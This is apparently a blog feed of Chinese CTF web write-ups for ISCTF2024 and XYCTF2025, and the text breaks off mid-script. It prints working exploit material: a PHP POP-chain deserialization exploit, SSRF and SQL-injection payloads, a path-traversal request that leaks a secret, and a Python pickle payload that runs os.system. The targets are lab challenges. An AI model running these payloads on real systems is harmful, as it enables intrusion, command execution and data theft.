&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Tianmingren</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$tianming</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ren</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;迷途中的羔羊，你相信天命吗？&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;tianming;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Wukong&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;开局一根棍，装备全靠打。&#x27;</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>序列化poc</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>序列化exp</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs leaf">&lt;?php<br><br>class Tianmingren &#123;<br>    public $tianming;<br>&#125;<br><br>class Dinghaishenzhen &#123;<br>    public $yun;<br>&#125;<br><br>class Huoyanjinjing &#123;<br>    public $huoyan;<br>&#125;<br><br>class Wuzhishan&#123;<br>    <br>&#125;<br><br>$a = new Tianmingren();<br>$a-&gt;tianming = new Dinghaishenzhen();<br>$a-&gt;tianming-&gt;yun = new Huoyanjinjing();<br>$a-&gt;tianming-&gt;yun-&gt;huoyan = new Wuzhishan();<br><br>echo serialize($a);<br><br>// Tianmingren<span class="hljs-punctuation">#</span><span class="hljs-keyword">__destruct</span><span class="hljs-params">()</span>==&gt;Dinghaishenzhen<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Huoyanjinjing<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;Wuzhishan<span class="hljs-punctuation">#</span><span class="hljs-keyword">__get</span><span class="hljs-params">()</span><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>绕过__get()方法中的判断只要找一个0e开头的字符串且其md5值仍为0e开头即可</p><p>源码中的“throw new Exception(‘开局一根棍，装备全靠打。’);”会抛出一个异常，直接中断脚本执行，去破坏反序列化结构，这里通过将下图中选中出的0修改为2，达到破坏反序列化结构的目的</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/tianming.png"></p><h2 id="新闻系统"><a href="#新闻系统" class="headerlink" title="新闻系统"></a>新闻系统</h2><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><h2 id="ezejs"><a href="#ezejs" class="headerlink" title="ezejs"></a>ezejs</h2><h2 id="小蓝鲨的冒险"><a href="#小蓝鲨的冒险" class="headerlink" title="小蓝鲨的冒险"></a>小蓝鲨的冒险</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;isctf2024&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span> == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;QAQ&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>) == <span class="hljs-number">2024</span>)&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$which</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>];<br>            <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$which</span>)&#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>                    <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;QAQ&#x27;</span>);<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>                    <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$which</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-keyword">echo</span> GWF_HTML::<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;PHP-0817&#x27;</span>, <span class="hljs-string">&#x27;Hacker NoNoNo!&#x27;</span>, <span class="hljs-literal">false</span>);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>parse_str()：php中的一个函数，作用为将查询的字符串解析到变量中</p><p>@parse_str($b)：这个函数不会检测变量$b是否存在，如果通过其他方式传入数据给变量$b,且当前$b中数据存在，会将其直接覆盖</p><blockquote><p>b&#x3D;a[0]&#x3D;<em>240610708</em></p></blockquote><p>num不能等于2024，但num转化为整数后等于2024且num中不能含有字母</p><blockquote><p>num&#x3D;2024.1</p></blockquote><p>第一个case没有加break，字符串flag与0匹配（<strong>在php中，对于纯数字类型的switch在遇到字符或字符串时会强制int转换</strong>，本题转换为0），继续向下执行，到case3输出flag</p><p><img src="/2025/05/16/ISCTF2024-WEB%E5%A4%8D%E7%8E%B0/mx.png"></p><h2 id="小蓝鲨的临时存储室"><a href="#小蓝鲨的临时存储室" class="headerlink" title="小蓝鲨的临时存储室"></a>小蓝鲨的临时存储室</h2><h2 id="小蓝鲨的书店"><a href="#小蓝鲨的书店" class="headerlink" title="小蓝鲨的书店"></a>小蓝鲨的书店</h2><h2 id="小蓝鲨的故事"><a href="#小蓝鲨的故事" class="headerlink" title="小蓝鲨的故事"></a>小蓝鲨的故事</h2><h2 id="小蓝鲨的秘密"><a href="#小蓝鲨的秘密" class="headerlink" title="小蓝鲨的秘密"></a>小蓝鲨的秘密</h2><h2 id="蓝鲨的java入门课堂"><a href="#蓝鲨的java入门课堂" class="headerlink" title="蓝鲨的java入门课堂"></a>蓝鲨的java入门课堂</h2><p>参考博客：</p><p><a href="https://blog.csdn.net/2301_79700060/article/details/143854365">https://blog.csdn.net/2301_79700060/article/details/143854365</a></p><p><a href="https://www.zijie.fun/2024/11/11/ISCTF2024/">https://www.zijie.fun/2024/11/11/ISCTF2024/</a></p><p><a href="https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/">https://yxing-1.github.io/2025/02/03/ISCTF2024%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024">https://tremse.github.io/2024/11/18/wpforisctf2024/#wp-for-isctf2024</a></p><p><a href="https://nanian-233.github.io/posts/ISCTF2024.html">https://nanian-233.github.io/posts/ISCTF2024.html</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xyctf2025_web复现</title>
    <link href="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> sqlite3<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> json<br><br>app = flask.Flask(__name__)<br>blacklist = string.ascii_letters<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">binary_to_string</span>(<span class="hljs-params">binary_string</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(binary_string) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Binary string length must be a multiple of 8&quot;</span>)<br>    binary_chunks = [binary_string[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>    string_output = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(chunk, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> binary_chunks)<br>    <br>    <span class="hljs-keyword">return</span> string_output<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/proxy&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nolettersproxy</span>():<br>    url = flask.request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&#x27;No URL provided&#x27;</span>)<br>    <br>    target_url = <span class="hljs-string">&quot;http://lamentxu.top&quot;</span> + url<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> url:<br>            <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">in</span> url:<br>        <span class="hljs-keyword">return</span> flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&#x27;No ssrf allowed&#x27;</span>)<br>    response = requests.get(target_url)<br><br>    <span class="hljs-keyword">return</span> flask.Response(response.content, response.status_code)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">db_search</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-keyword">with</span> sqlite3.connect(<span class="hljs-string">&#x27;database.db&#x27;</span>) <span class="hljs-keyword">as</span> conn:<br>        cur = conn.cursor()<br>        cur.execute(<span class="hljs-string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="hljs-subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)<br>        found = cur.fetchone()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> found <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> found[<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-built_in">print</span>(flask.request.remote_addr)<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/1337&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">api_search</span>():<br>    <span class="hljs-keyword">if</span> flask.request.remote_addr == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>:<br>        code = flask.request.args.get(<span class="hljs-string">&#x27;0&#x27;</span>)<br>        <span class="hljs-keyword">if</span> code == <span class="hljs-string">&#x27;abcdefghi&#x27;</span>:<br>            req = flask.request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                req = binary_to_string(req)<br>                <span class="hljs-built_in">print</span>(req)<br>                req = json.loads(req) <span class="hljs-comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span><br>            <span class="hljs-keyword">except</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Invalid JSON&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;name&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> req:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Empty Person&#x27;s name&quot;</span>)<br><br>            name = req[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) &gt; <span class="hljs-number">6</span>:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Too long&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO &#x27;&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;)&#x27;</span> <span class="hljs-keyword">in</span> name:<br>                flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;NO )&quot;</span>)<br>            <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            Some waf hidden here ;)</span><br><span class="hljs-string">            &quot;&quot;&quot;</span><br><br>            fate = db_search(name)<br>            <span class="hljs-keyword">if</span> fate <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                flask.abort(<span class="hljs-number">404</span>, <span class="hljs-string">&quot;No such Person&quot;</span>)<br><br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;Fate&#x27;</span>: fate&#125;<br>        <span class="hljs-keyword">else</span>:<br>            flask.abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;Hello local, and hello hacker&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        flask.abort(<span class="hljs-number">403</span>, <span class="hljs-string">&quot;Only local access allowed&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p><strong>关键路由</strong></p><p>1、&#x2F;proxy：获取用户请求中的url参数，将其拼接到<a href="http://lamentxu.top/">http://lamentxu.top</a> 后面，检查后通过requests.get发出请求，并返回响应内容（打ssrf）</p><p>2、&#x2F;1337：接受本地请求，简单检查后执行数据库查询操作（打sql注入）</p><p><strong>先是ssrf</strong></p><p>源码在目标url前加了一个域名lamentxu.top，加一个@跳到自定义的url</p><p>禁用了所有字母和“.”，可以用十进制表示IPV4地址（点分十进制：127.0.0.1，二进制：0111 1111 0000 0000 0000 0000 0000 0001，十进制：2130706433），或者用0绕过（linux中访问0会解析为127.0.0.1）</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337</p></blockquote><p><strong>然后绕过&#x2F;1337路由下的检查</strong></p><p>首先传入的参数0需要等于“abcdefghi”，但是代理网页禁用了所有字母，可以用二次url编码绕过</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39</p></blockquote><p>然后去构造参数1，参数1会经过一个binary_to_string()函数，将二进制转为一个字符串，这里按照binary_to_string()去写一个stirng_to_binary()函数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">string_to_binary</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;将可读文本转换为二进制字符串&#x27;&#x27;&#x27;</span><br>    binary_list = [<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(c), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> text]<br>    binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(binary_list)<br>    <span class="hljs-keyword">return</span> binary_string<br></code></pre></td></tr></table></figure><p>接下来进行长度绕过，<strong>len()函数对字符串会统计其字符的个数，而对元组、列表和字典只会统计其元素的个数</strong>，这里限制了元组和列表，使用字典绕过</p><p><strong>最后打sql注入</strong></p><p>init_db.py中有提示，可以直接查···WHERE NAME &#x3D; ‘LAMENTXU’</p><p>先用)))))))去闭合前面的upper()函数，再union进行联合注入</p><p>构造的json</p><blockquote><p>original_text &#x3D; ‘’’{“name”: {“‘))))))) UNION SELECT FATE FROM FATETABLE WHERE NAME&#x3D;’LAMENTXU’ –”: 1}}’’’</p></blockquote><p>利用string_to_binary()转成二进制，最终payload</p><blockquote><p>&#x2F;proxy?url&#x3D;@0:8080&#x2F;1337?0&#x3D;%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%261&#xp></blockquote><p>bp打</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/fate.png"></p><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    secret = f.read()<br><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><p><strong>关键路由</strong></p><p>1、&#x2F;download：可以读取任意文件，但限制了目录穿越</p><p>2、&#x2F;secret：进行用户验证（调用了get_cookie()，get_cookie()中有一段代码是将base64解码后进行反序列化，拿到secret即可进行反序列化）</p><p><img src="/2025/05/11/xyctf2025-web%E5%A4%8D%E7%8E%B0/Signin1.png"></p><p><strong>先拿secret</strong></p><p>通过.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt，绕过限制进行目录穿越拿secret</p><blockquote><p>payload：download&#x2F;filename&#x3D;.&#x2F;..&#x2F;.&#x2F;..&#x2F;secret.txt</p><p>secret：Hell0_H@cker_Y0u_A3r_Sm@r7</p></blockquote><p><strong>打pickle反序列化</strong></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> cookie_encode<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://gz.imxbt.cn:20154/secret&quot;</span><br>secret = <span class="hljs-string">&quot;Hell0_H@cker_Y0u_A3r_Sm@r7&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;cp /f* ./flag.txt&#x27;)&quot;</span>,))<br><br>name = cookie_encode(<br>    (<span class="hljs-string">&#x27;session&#x27;</span>, &#123;<span class="hljs-string">&quot;name&quot;</span>: [Test()]&#125;),<br>    secret<br>)<br><br><span class="hljs-comment">#print(name.decode())</span><br><br>requests.get(url, cookies=&#123;<span class="hljs-string">&#x27;name&#x27;</span>: 